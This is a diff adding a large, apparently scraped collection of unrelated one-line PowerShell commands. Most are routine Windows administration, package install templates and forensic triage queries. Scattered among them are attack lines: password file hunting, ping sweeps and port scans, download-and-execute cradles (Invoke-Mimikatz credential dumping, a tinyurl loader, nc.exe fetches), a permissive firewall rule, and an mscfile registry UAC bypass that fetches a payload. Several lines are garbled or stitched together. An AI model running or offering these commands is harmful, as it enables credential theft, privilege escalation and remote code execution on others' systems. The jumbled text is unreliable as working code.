@@ -1,0 +1,510 @@
+$packageName = '{{PackageName}}';$installerType = 'exe';$url = '{{DownloadUrl}}';$silentArgs = '/VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP-';$validExitCodes = @(0)
+ping 172.16.3.2
+ping 192.168.5.100
+ping 10.0.0.1
+Get-ChildItem
+Copy-Item src.txt dst.txt
+Move-Item src.txt dst.txt
+Select-String –path c:\Users\* –pattern password
+ls -r c:\users -file | % {Select-String -path $_ -pattern password}
+Get-Location
+Get-Process
+Install-ChocolateyPackage "$packageName" "$installerType" "$silentArgs" "$url" -validExitCodes $validExitCodes;$packageName = 'rapidcrc-unicode'
+1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}
+1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","nc.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://arpedc/cmd.exe","cmd.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://arpedc/iexplore.exe","iexplore.exe")
+Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt
+Get-HotFix
+Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run
+Get-NetFirewallRule –all
+New-NetFirewallRule -Action Allow -DisplayNameLetMeIn -RemoteAddress 10.10.10.25 
+$installerType = 'msi';$url = '{{DownloadUrl}}';$url64 = '{{DownloadUrlx64}}'
+dir C:\pub | where­object LastWriteTime ­gt (Get­Date).addDays(­1)
+ps | where­object {$_.path ­like "C:\windows\system32*" ­and $_.company ­notlike "Microsoft*"}
+ps Explorer | select­object ­Property ProcessName ­ExpandProperty Modules | format­list
+ps | Sort­Object ­Property WorkingSet | Select­Object ­Last 5
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds”
+Start-Process -FilePath .\nssm.exe -ArgumentList 'install MyService "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command { . C:\Scripts\Monitor.ps1; Start-Monitoring }" ' -NoNewWindow -Wait
+[net.webrequest]::defaultwebproxy.credentials = [net.credentialcache]::defaultcredentials; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX (New-Object Net.WebClient).DownloadString(‘https://mine.apps.com/login-prompt.ps1’)
+a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5aiek4e')",1,true)
+cmd.exe /c net start AdSync
+C:\Windows\system32\cmd.exe /c ""C:\ProgramData\CentraStage\Packages\02338898-01c8-4fe8-a03c-cbcd5671f221#\command.bat""
+$silentArgs = '/quiet /norestart';$validExitCodes = @(0)
+C:\Windows\system32\cmd.exe /d /c C:\Windows\system32\silcollector.cmd configure
+Stop-Computer -Force
+Restart-Computer -Force
+Get-CimInstance -Classname Win32_OperatingSystem | Invoke-CimMethod -MethodName Shutdown
+Get-CimInstance -ClassName Win32_Desktop
+Get-CimInstance -ClassName Win32_Desktop | Select-Object -ExcludeProperty "CIM*"
+Get-CimInstance -ClassName Win32_BIOS
+Install-ChocolateyPackage "$packageName" "$installerType" "$silentArgs" "$url" "$url64"  -validExitCodes $validExitCodes;#requires -Version 5;$computers = ''
+Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"
+Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property SystemType
+Get-CimInstance -ClassName Win32_ComputerSystem
+Get-CimInstance -ClassName Win32_QuickFixEngineering
+Get-CimInstance -ClassName Win32_QuickFixEngineering -Property HotFixID
+Get-CimInstance -ClassName Win32_QuickFixEngineering -Property HotFixId | Select-Object -Property HotFixId
+Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property BuildNumber,BuildType,OSType,ServicePackMajorVersion,ServicePackMinorVersion
+Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property NumberOfLicensedUsers,NumberOfUsers,RegisteredUser
+Get-CimInstance -ClassName Win32_LogonSession
+Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName
+$OutputPath = 'C:\Install\DSClocal'
+Get-CimInstance -ClassName Win32_LocalTime
+Get-CimInstance -ClassName Win32_Service | Select-Object -Property Status,Name,DisplayName
+Get-CimInstance -ClassName Win32_Service | Format-Table -Property Status,Name,DisplayName -AutoSize -Wrap
+Get-Process -id 0
+Get-Process -id 99
+Get-Process -Name ex*
+Get-Process -Name PowerShell -ComputerName localhost, Server01, Server02
+Get-Process -Name PowerShell -ComputerName localhost, Server01, Server01 | Format-Table -Property ID, ProcessName, MachineName
+Stop-Process -Name t*,e* -Confirm
+Get-Process | Where-Object -FilterScript {$_.Responding -eq $false} | Stop-Process
+$cim = New-CimSession -ComputerName $computers
+Get-Process -Name BadApp | Where-Object -FilterScript {$_.SessionId -neq 0} | Stop-Process
+Get-Process -Name powershell | Where-Object -FilterScript {$_.Id -ne $PID} | Stop-Process -PassThru
+Get-Service -Name se*
+Get-Service -DisplayName se*
+Get-Service -DisplayName ServiceLayer,Server
+Get-Service -ComputerName Server01
+Get-Service -Name LanmanWorkstation -RequiredServices
+Get-Service -Name LanmanWorkstation -DependentServices
+Get-Service -Name * | Where-Object {$_.RequiredServices -or $_.DependentServices} | Format-Table -Property Status, Name, RequiredServices, DependentServices -auto
+Stop-Service -Name spooler
+[DSCLocalConfigurationManager()]
+Start-Service -Name spooler
+Suspend-Service -Name spooler
+Restart-Service -Name spooler
+Get-Service | Where-Object -FilterScript {$_.CanStop} | Restart-Service
+Get-PSDrive
+Get-PSDrive -PSProvider FileSystem
+Get-PSDrive -PSProvider Registry
+New-PSDrive -Name Office -PSProvider FileSystem -Root "C:\Program Files\Microsoft Office\OFFICE11"
+New-PSDrive -Name cvkey -PSProvider Registry -Root HKLM\Software\Microsoft\Windows\CurrentVersion
+Remove-PSDrive -Name Office
+Configuration LCM_Push{Param([string[]]$ComputerName);Node $ComputerName{Settings{AllowModuleOverwrite = $True;ConfigurationMode = 'ApplyAndAutoCorrect';RefreshMode = 'Push';RebootNodeIfNeeded = $True}}}
+Remove-PSDrive -Name cvkey
+Get-CimInstance -Class Win32_Printer
+(New-Object -ComObject WScript.Network).EnumPrinterConnections()
+(New-Object -ComObject WScript.Network).AddWindowsPrinterConnection("\\Printserver01\Xerox5")
+$printer = Get-CimInstance -Class Win32_Printer -Filter "Name='HP LaserJet 5Si'"; Invoke-CimMethod -InputObject $printer -MethodName SetDefaultPrinter
+(New-Object -ComObject WScript.Network).SetDefaultPrinter('HP LaserJet 5Si')
+(New-Object -ComObject WScript.Network).RemovePrinterConnection("\\Printserver01\Xerox5")
+Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=$true | Select-Object -ExpandProperty IPAddress
+Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=$true
+Get-CimInstance -Class Win32_PingStatus -Filter "Address='127.0.0.1'"
+foreach ($computer in $computers){$GUID = (New-Guid).Guid;LCM_Push -ComputerName $Computer -OutputPath $OutputPath;Set-DSCLocalConfigurationManager -Path $OutputPath  -CimSession $computer}
+Get-CimInstance -Class Win32_PingStatus -Filter "Address='192.168.0.1'"
+Get-CimInstance -Class Win32_PingStatus -Filter "Address='192.168.0.1'" | Format-Table -Property Address,ResponseTime,StatusCode -Autosize
+Get-CimInstance -Class Win32_NetworkAdapter -ComputerName .
+Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=$true | ForEach-Object -Process { $_.SetDNSDomain('fabrikam.com') }
+Get-CimInstance -Class Win32_Product | Where-Object Name -eq "Microsoft .NET Core Runtime - 2.1.5 (x64)"
+Write-Host -f Red "[$FPRoot] is unreachable!"
+Write-Host -f Gray "Checking write permissions... " -NoNewline
+New-Item -ItemType File -Path $temp -ErrorAction Stop -Value 'Delete Me' -Force | Out-Null
+Remove-Item $temp -Force -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://$FPDownloadRoot/currentmajor.xml" -OutFile "$FPRoot\currentmajor.xml" -ErrorAction Stop @WebrequestParams
+Configuration SQLstandalone{Import-DscResource â€“Module PSDesiredStateConfiguration;Import-DscResource -Module xSQLServer;Node $AllNodes.NodeName{LocalConfigurationManager{AllowModuleOverwrite = $true;RebootNodeIfNeeded = $true}WindowsFeature "NET"{Ensure = "Present";Name = "NET-Framework-Core";Source = $Node.NETPath}if($Node.Features){xSqlServerSetup ($Node.NodeName){DependsOn = '[WindowsFeature]NET';SourcePath = $Node.SourcePath;SetupCredential = $Node.InstallerServiceAccount;InstanceName = $Node.InstanceName;Features = $Node.Features;SQLSysAdminAccounts = $Node.AdminAccount;UpdateEnabled = "True";UpdateSource = $Node.SourcePath + "\Updates";InstallSharedDir = "E:\Program Files\Microsoft SQl Server";InstallSharedWOWDir = "E:\Program Files (x86)\Microsoft SQL Server";InstanceDir = "E:\Program Files\Microsoft SQL Server";InstallSQLDataDir = "E:\Program Files\Microsoft SQL Server\MSSQL12." + $SQLInstanceName + "\MSSQL\Data";SQLUserDBDir = "F:\Data";SQLUserDBLogDir = "G:\Logs";SQLTempDBDir = "H:\TempDB";SQLTempDBLogDir = "H:\TempDB";SQLBackupDir = "I:\Backups"}xSqlServerFirewall ($Node.NodeName){DependsOn = ("[xSqlServerSetup]" + $Node.NodeName);SourcePath = $Node.SourcePath;InstanceName = $Node.InstanceName;Features = $Node.Features}xSQLServerPowerPlan ($Node.Nodename){Ensure = "Present"}xSQLServerMemory ($Node.Nodename){DependsOn = ("[xSqlServerSetup]" + $Node.NodeName);Ensure = "Present";DynamicAlloc = $false;MinMemory = "256";MaxMemory ="1024"}xSQLServerMaxDop($Node.Nodename){DependsOn = ("[xSqlServerSetup]" + $Node.NodeName);Ensure = "Present";DynamicAlloc = $true}}}}
+Install-ChocolateyPackage "$packageName" "$installerType" "$silentArgs" "$url" -validExitCodes $validExitCodes$packageName = '{{PackageName}}'
+$sourceXML = "https://$FPDownloadRoot/$_/xml/version.xml"; $sourceWinAX = "http://$FPDownloadRoot/$_/install/install_all_win_ax_sgn.z"; $sourceWinPL = "http://$FPDownloadRoot/$_/install/install_all_win_pl_sgn.z"; $sourceWin64AX = "http://$FPDownloadRoot/$_/install/install_all_win_64_ax_sgn.z"; $sourceWin64PL = "http://$FPDownloadRoot/$_/install/install_all_win_64_pl_sgn.z"; $SourceInstall = $sourceWinAX,$sourceWinPL,$sourceWin64AX,$sourceWin64PL
+$DestXML = "$FPRoot\$_\xml"; Invoke-WebRequest -Uri $sourceXML -OutFile "$DestXML\$($sourceXML.Split('/')[-1])" -ErrorAction Stop @WebrequestParams
+$ChocolateyPackageInstallerFolder = Join-Path $env:ALLUSERSPROFILE -ChildPath $("ChocolateyPackageInstaller-" + [System.DateTime]::Now.ToString("yyyy-MM-dd-HH-mm-ss"))
+$ScriptLog = Join-Path -Path $ChocolateyPackageInstallerFolder -ChildPath "ChocolateyPackageInstaller.log"
+$ChocolateyInstallLog = Join-Path -Path $ChocolateyPackageInstallerFolder -ChildPath "ChocolateyInstall.log"
+$separator = @(";",","); $splitOption = [System.StringSplitOptions]::RemoveEmptyEntries; $packages = $packagesList.Trim().Split($separator, $splitOption)
+choco install $package --force --yes --acceptlicense --verbose --allow-empty-checksums | Out-Null 
+Get-WmiObject -Class win32_service -Filter "state= '$servicestate'" -ComputerName $computername | Select-Object -Property name,state,startname,startmode,systemname
+$temp = "$FPRoot\WritePermTest.tmp"; New-Item -ItemType File -Path $temp -ErrorAction Stop -Value 'Delete Me' -Force | Out-Null
+$WebrequestParams=@{}; Invoke-WebRequest -Uri "https://$FPDownloadRoot/currentmajor.xml" -OutFile "$FPRoot\currentmajor.xml" -ErrorAction Stop @WebrequestParams
+$ConfigurationData = @{AllNodes = @(@{NodeName = "*";PSDscAllowPlainTextPassword = $true;PSDscAllowDomainUser =$true;NETPath = "\\NJ09FIL526.mhf.mhc\GOI_Build$\Database\SQLAutoInstall\WIN2012R2\sxs";SourcePath = "\\NJ09FIL526.mhf.mhc\GOI_Build$\Database\SQLAutoInstall\SQL2014";InstallerServiceAccount = Get-Credential -UserName MHF\PE_svc_SQLInstall -Message "Credentials to Install SQL Server";AdminAccount = "MHF\PE_svc_SQLSA";})}
+$num = "00$p"; $num = $num[($num.Length -3)..($num.Length - 1)] -join ''
+$chapterURI = "$BaseURI/c0$c"; $webpage = Invoke-WebRequest -Uri "$chapterURI/$p.html" -UserAgent $ua -SessionVariable TempMangaSession | select -ExpandProperty RawContent; $string = $webpage.Split("`n") | where {$_ -Match 'img src="http://h.mangatown.com/store/manga/'}
+$chapterURI = "$BaseURI/c0$c"; $chapData = Invoke-WebRequest -Uri $chapterURI -UserAgent $ua | select -ExpandProperty RawContent
+$URI = $string -replace '^.*src="(.+ttl=\d{8,12})"\s.+$', '$1'
+$ExchangeSession = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://mail.company.com/PowerShell/ -Authentication Kerberos
+$SamAccountName = "username"; Get-ADUser -Identity $SamAccountName
+$SamAccountName = "IIvanov"; Get-Mailbox -Identity "$SamAccountName@$MailDomain"
+$SamAccountName = "IIvanov"; Get-ADUser * -Filter "DisplayName -eq '$DisplayName'"
+$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
+Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
+ForEach ($computer in $computers) {$ConfigurationData.AllNodes += @{NodeName        = $computer;InstanceName= "MSSQLSERVER";Features= "SQLENGINE,FULLTEXT,SSMS,ADV_SSMS"}$Destination = "\\"+$computer+"\\c$\Program Files\WindowsPowerShell\Modules";Copy-Item 'C:\Program Files\WindowsPowerShell\Modules\xSQLServer' -Destination $Destination -Recurse -Force}
+$ExecutableFiles = @("*.EXE","*.COM","*.BAT","*.BIN","*.JOB","*.WS",".WSF","*.PS1",".PAF","*.MSI","*.CGI","*.CMD","*.JAR","*.JSE","*.SCR","*.SCRIPT","*.VB","*.VBE","*.VBS","*.VBSCRIPT","*.DLL")
+date | select DateTime | ConvertTo-html -Body "<H2> Current Date and Time</H2>" >> $OutLevel1 
+openfiles /local on 
+systeminfo /FO CSV | ConvertFrom-Csv | select-object * -ExcludeProperty 'Hotfix(s)','Network Card(s)' | ConvertTo-html -Body "<H2> System Information</H2>" >> $OutLevel1
+gwmi -ea 0 Win32_UserProfile | select LocalPath, SID,@{NAME='last used';EXPRESSION={$_.ConvertToDateTime($_.lastusetime)}} | ConvertTo-html -Body "<H2> User accounts and current login Information </H2>" >> $OutLevel1
+gwmi -ea 0 Win32_NetworkAdapterConfiguration |where{$_.IPEnabled -eq 'True'} | select DHCPEnabled,@{Name='IpAddress';Expression={$_.IpAddress -join '; '}},@{Name='DefaultIPgateway';Expression={$_.DefaultIPgateway -join '; '}},DNSDomain | ConvertTo-html -Body "<H2> Network Configuration Information</H2>" >> $OutLevel1
+gp -ea 0 'hklm:\system\currentcontrolset\control\session manager\memory management\prefetchparameters' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Startup Applications - prefetchparameters Registry Key </H2>" >> $OutLevel1
+gp -ea 0 'hklm:\software\microsoft\windows\currentversion\run' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Startup Applications - hklm-software-microsoft-windows-currentversion-run </H2>" >> $OutLevel1
+gp -ea 0 'hklm:\software\microsoft\windows\currentversion\runonceex' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Startup Applications - Additional for 64 bit Systems </H2>" >> $OutLevel1
+gp -ea 0 'hkcu:\software\wow6432node\microsoft\windows\currentversion\run' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Startup Applications - Additional for 64 bit Systems </H2>" >> $OutLevel1
+SQLSA -ConfigurationData $ConfigurationData -OutputPath $OutputPath
+gp -ea 0 'hkcu:\software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer\ Run' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Startup Applications - Additional for 64 bit Systems </H2>" >> $OutLevel1
+$cmd = netstat -nao | select-string "ESTA"
+New-Object -TypeName psobject -Property @{ 'Local IP : Port#'=$data[1];
+ConvertTo-html -Property 'Local IP : Port#', 'Remote IP : Port#','Process ID','Process Name','Process Start Time','Process File Path','Associated DLLs and File Path' -Body "<H2></H2>" >> $OutLevel1
+gwmi -ea 0 win32_process | select processname,@{NAME='CreationDate';EXPRESSION={$_.ConvertToDateTime($_.CreationDate)}},ProcessId,ParentProcessId,CommandLine,sessionID | sort ParentProcessId -desc | ConvertTo-html -Body "<H2> Running Processes sorted by ParentProcessID</H2>" >> $OutLevel1
+gwmi -ea 0 win32_process | where {$_.name -eq 'svchost.exe'} | select ProcessId |foreach-object {$P = $_.ProcessID ;gwmi win32_service |where {$_.processId -eq $P} | select processID,name,DisplayName,state,startmode,PathName} |  ConvertTo-html -Body "<H2> Running SVCHOST and associated Processes </H2>" >> $OutLevel1
+gwmi -ea 0 win32_Service | select Name,ProcessId,State,DisplayName,PathName | sort state | ConvertTo-html -Body "<H2> Running Services - Sorted by State</H2>" >> $OutLevel1
+driverquery.exe /v /FO CSV | ConvertFrom-CSV | Select 'Display Name','Start Mode', Path | sort Path | ConvertTo-html -Body "<H2> Drivers running, Startup mode and Path - Sorted by Path </H2>" >> $OutLevel1
+gci -r -ea 0 c:\ -include *.dll | select Name,CreationTime,LastAccessTime,Directory | sort CreationTime -desc | select -first 50 | ConvertTo-html -Body "<H2> Last 50 DLLs created - Sorted by CreationTime </H2>" >> $OutLevel1
+openfiles /query > "c:\windows\temp\$CompName-$User-$Date-OpenFiles.txt"
+foreach($Computer in $Computers) {Start-DscConfiguration -ComputerName $Computer -Path $OutputPath -Verbose -Wait -Force}
+gwmi -ea 0 Win32_Share | select name,path,description | ConvertTo-html -Body "<H2> Open Shares</H2>" >> $OutLevel1
+gp -ea 0 'hkcu:\Software\Microsoft\Windows\CurrentVersion\explorer\Map Network Drive MRU' | select * -ExcludeProperty PS* |  ConvertTo-html -Body "<H2> Mapped Drives </H2>" >> $OutLevel1
+gwmi -ea 0 Win32_ScheduledJob | ConvertTo-html -Body "<H2> Scheduled Jobs </H2>" >> $OutLevel1
+get-winevent -ea 0 -logname Microsoft-Windows-TaskScheduler/Operational | select TimeCreated,ID,Message | ConvertTo-html -Body "<H2> Scheduled task events   </H2>" >> $OutLevel1
+Get-HotFix -ea 0| Select HotfixID, Description, InstalledBy, InstalledOn | Sort-Object InstalledOn -Descending | ConvertTo-html -Body "<H2> HotFixes applied - Sorted by Installed Date </H2>" >> $OutLevel1
+gp -ea 0    HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*    | Select DisplayName,DisplayVersion,Publisher,InstallDate,InstallLocation | Sort InstallDate -Desc |  ConvertTo-html -Body "<H2> Installed Applications - Sorted by Installed Date </H2>" >> $OutLevel1
+gwmi -ea 0 Win32_ShortcutFile | select FileName,caption,@{NAME='CreationDate';EXPRESSION={$_.ConvertToDateTime($_.CreationDate)}},@{NAME=’LastAccessed’;EXPRESSION={$_.ConvertToDateTime($_.LastAccessed)}},@{NAME=’LastModified’;EXPRESSION={$_.ConvertToDateTime($_.LastModified)}},Target | Where-Object {$_.lastModified -gt ((Get-Date).addDays(-5)) }| sort LastModified -Descending | ConvertTo-html -Body "<H2> Link File Analysis -Last 5 days </H2>" >> $OutLevel1
+gci -Path C:\ -r -ea 0 -include $ExecutableFiles |Where {$_.Attributes -band [IO.FileAttributes]::Compressed} | ConvertTo-html -Body "<H2> Compressed files</H2>" >> $OutLevel1
+gci -Path C:\ -r -force -ea 0 -include $ExecutableFiles |Where {$_.Attributes -band [IO.FileAttributes]::Encrypted} | ConvertTo-html -Body "<H2> Encrypted files </H2>" >> $OutLevel1
+gwmi -ea 0 Win32_ShadowCopy | select DeviceObject,@{NAME='CreationDate';EXPRESSION={$_.ConvertToDateTime($_.InstallDate)}} | ConvertTo-html -Body "<H2> ShadowCopy List </H2>" >> $OutLevel1
+Set-DSCLocalConfigurationManager -Path $OutputPath  -CimSession $computer 
+gci -path C:\windows\prefetch\*.pf -ea 0 | select Name, LastAccessTime,CreationTime | sort LastAccessTime | ConvertTo-html -Body "<H2>Prefetch Files </H2>" >> $OutLevel1
+ipconfig /displaydns | select-string 'Record Name' | Sort | ConvertTo-html -Body "<H2> DNS Cache</H2>" >> $OutLevel1
+Get-WinEvent -max 50 -ea 0 -FilterHashtable @{Logname='system';ID=1014} | select TimeCreated,ID,Message | ConvertTo-html -Body "<H2> Event log – DNS – failed resolution events </H2>" >> $OutLevel1
+Get-WinEvent -ea 0 -ListLog * | Where-Object {$_.IsEnabled} | Sort-Object -Property LastWriteTime -Descending | select LogName, FileSize, LastWriteTime | ConvertTo-html -Body "<H2> List of available logs </H2>" >> $OutLevel1
+$la = $env:LOCALAPPDATA ;gci -r -ea 0 '$la\Microsoft\Windows\Temporary Internet Files' | select Name, LastWriteTime, CreationTime,Directory| Where-Object{$_.lastwritetime -gt ((Get-Date).addDays(-5)) }| Sort creationtime -Desc | ConvertTo-html -Body "<H2> Temporary Internet Files - Last 5 days - Sorted by CreationTime </H2>" >> $OutLevel1
+$a = $env:APPDATA; gci -r -ea 0 '$a\Microsoft\Windows\cookies' | select Name |foreach-object {$N = $_.Name ; get-content -ea 0 '$a\Microsoft\Windows\cookies\$N' | select-string '/'} | ConvertTo-html -Body "<H2> Cookies </H2>" >> $OutLevel1
+gp -ea 0 'hkcu:\Software\Microsoft\Internet Explorer\TypedUrls' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Typed URLs </H2>" >> $OutLevel1 
+gp -ea 0 'hkcu:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Important Registry keys - Internet Settings </H2>" >> $OutLevel1
+gci -ea 0 "hkcu:SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\EscDomains" | select PSChildName | ConvertTo-html -Body "<H2> Important Registry keys - Internet Trusted Domains </H2>" >> $OutLevel1
+gp -ea 0 'hklm:\Software\Microsoft\Windows NT\CurrentVersion\Windows' | select AppInit_DLLs | ConvertTo-html -Body "<H2> Important Registry keys - AppInit_DLLs </H2>" >> $OutLevel1
+Import-DscResource -Module PSDesiredStateConfiguration
+gp -ea 0 'hklm:\Software\Microsoft\Windows\CurrentVersion\policies\system' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Important Registry keys - UAC Group Policy Settings </H2>" >> $OutLevel1
+gp -ea 0 'HKLM:\Software\Microsoft\Active Setup\Installed Components\*' | select ComponentID,'(default)',StubPath | ConvertTo-html -Body "<H2>gci c:\ -r -ea 0 -include $ExecutableFiles |foreach {$P = $_.fullname; get-item $P -Stream *} |where {$_.Stream -match "Zone.Identifier"} Important Registry keys - Active setup Installs </H2>" >> $OutLevel1
+gp -ea 0 'hklm:\Software\Microsoft\Windows\CurrentVersion\App Paths\*' | select PSChildName,'(default)' | ConvertTo-html -Body "<H2> Important Registry keys - APP Paths keys </H2>" >> $OutLevel1
+gp -ea 0 'hklm:\software\microsoft\windows nt\CurrentVersion\winlogon\*\*' | select '(default)',DllName | ConvertTo-html -Body "<H2> Important Registry keys - DLLs loaded by Explorer.exe shell </H2>" >> $OutLevel1
+gp -ea 0 'hklm:\software\microsoft\security center\svc' | select * -ExcludeProperty PS* | ConvertTo-html -Body "<H2> Important Registry Keys -Security center SVC values </H2>" >> $OutLevel1
+gp -ea 0 'hklm:\system\currentcontrolset\enum\usbstor\*\*' | select FriendlyName,PSChildName,ContainerID | ConvertTo-html -Body "<H2> List of USB devices </H2>" >> $OutLevel1
+gci -Path 'C:\' -r -force -ea 0 -include $ExecutableFiles | Where-Object {-not$_.PSIsContainer -and $_.lastwritetime -gt ((Get-Date).addDays(-30)) } | select fullname,lastwritetime,@{N='Owner';E={($_ | Get-ACL).Owner}} | sort lastwritetime -desc | ConvertTo-html -Body "<H2> File Timeline Executable Files - Past 30 days </H2>" >> $OutLevel1
+gci -Path 'c:\' -r -force -ea 0 -include $ExecutableFiles | foreach {$P = $_.fullname; get-item $P -Stream *} | where {$_.Stream -match "Zone.Identifier"} | select FileName,stream,@{N='LastWriteTime';E={(dir $P).LastWriteTime}} | ConvertTo-html -Body "<H2> Downloaded executable files </H2>" >> $OutLevel1
+date | select DateTime | ConvertTo-html -Body "<H2> Current Date and Time</H2>" >> $OutLevel1
+netstat -naob > "c:\windows\temp\$CompName-$User-$Date-NetworkConnections.txt"
+Type = "Directory"
+gc $env:windir\system32\drivers\etc\hosts > "c:\windows\temp\$CompName-$User-$Date-HostsFile.txt"
+auditpol /get /category:* | select-string 'No Auditing' -notmatch > "c:\windows\temp\$CompName-$User-$Date-AuditPolicy.txt"
+netsh advfirewall firewall show rule name=all > "c:\windows\temp\$CompName-$User-$Date-FirewallConfig.txt"
+ipconfig /displaydns|?{$_ -like "Record Name" >> "c:\windows\temp\$CompName-$User-$Date-DNSCache.txt"}
+ipconfig /displaydns|?{$_ -like "Record" >> "c:\windows\temp\$CompName-$User-$Date-DNSCache.txt"}
+$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
+$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
+$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"; New-Item -Path $MscRegPath -Force | Out-Null
+$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"; $ValName = "(Default)"; $RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadFile('$PsPayload','$LocalFile')"
+$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'; $a_cmd = "C:\windows\system32\cmd.exe"; &$a_cmd = $CompMgmtBypass
+ping 172.16.0.1
+$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"; $ValName = "(Default)"; $RegValue = "C:\Program Files\Common Files\Intel\WirelessCommon\RegSrvc.exe"; New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
+$MscRegCleanup = "HKCU:\Software\Classes\mscfile"; Remove-Item -Path $MscRegCleanup -Force  -Recurse -ErrorAction SilentlyContinue | Out-Null
+Disable-CertificateValidation
+netsh wlan show networks mode=bssid
+$mylocation = new-object –ComObject LocationDisp.LatLongReportFactory; $latitude = $mylocation.LatLongReport.Latitude 
+[Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Tools\cmder\vendor\git-for-windows\mingw32\bin\", [EnvironmentVariableTarget]::Machine)
+[Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Tools\cmder\vendor\git-for-windows\usr\bin\", [EnvironmentVariableTarget]::Machine)
+[string]$name = Read-Host "Nom de l'utilisateur"; [string]$domain = Read-Host "Nom du domaine"; $password = Read-Host -AsSecureString "Mot de passe"; New-ADUser -name $name -server $domain -AccountPassword $password -Enabled $true
+Remove-Item -path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Media Cache" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies-Journal" -Recurse -Force -EA SilentlyContinue
+Write-Host Green I'm alright
+Remove-Item -path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\ChromeDWriteFontCache" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Local Storage\http*" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\data*" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\IndexedDB" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\Users\$($_.Name)\AppData\Local\Microsoft\Windows\Temporary Internet Files\*" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\Users\$($_.Name)\AppData\Local\Microsoft\Windows\WER\*" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\Users\$($_.Name)\AppData\Local\Temp\*" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\Windows\Temp\*" -Recurse -Force -EA SilentlyContinue
+Remove-Item -path "C:\`$recycle.bin\" -Recurse -Force -EA SilentlyContinue
+$Computer = (Get-ADComputer -Property LastLogonTimestamp -Filter $Filter).Name; $Result = Get-WmiObject -ComputerName $Computer -Class win32_ComputerSystem | Select-Object Name, Username
+Write-Output "Last group already exploded - stopping here to prevent infinite recursion!"
+$installerType = 'exe';$url = '{{DownloadUrl}}';$silentArgs = '/S';$validExitCodes = @(0)
+$Computer = (Get-ADComputer -Property LastLogonTimestamp -Filter $Filter).Name; $Result = Get-WmiObject -ComputerName $Computer -Class win32_ComputerSystem | Select-Object Name, Username; $Result | Add-Member -Type NoteProperty -Name "Last Discovered" -Value "$((Get-Date).ToShortDateString()) $((get-date).ToShortTimeString())"
+$Computer = (Get-ADComputer -Property LastLogonTimestamp -Filter $Filter).Name; $Process = Get-WmiObject -ComputerName $Computer -Class Win32_Process | Where-Object Name -match explorer
